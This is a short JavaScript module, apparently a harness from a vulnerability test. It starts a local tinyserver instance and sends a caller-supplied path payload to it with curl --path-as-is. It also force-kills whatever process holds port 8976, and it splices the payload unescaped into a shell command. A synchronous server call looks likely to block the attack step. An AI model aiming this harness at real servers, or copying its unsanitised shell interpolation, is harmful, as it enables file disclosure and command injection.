const path = require("path");
const { execSync } = require("child_process");
const sleep = require("sleep");

function exploitFunction(payload) {
    // Kill any existing server on port 8976
    try {
        execSync("fuser -k 8976/tcp");
    } catch (e) {}

    // Start the tinyserver
    const server = "node ./node_modules/tinyserver/lib/main.js 8976";
    execSync(server, { stdio: 'inherit' });

    // Wait for the server to start
    sleep.sleep(2);

    // Generate the attack string with the payload
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8976${payload}"`;

    // Execute the attack string
    const result = execSync(attack_string, { stdio: 'pipe' });

    return result.toString();
}

module.exports = { exploitFunction };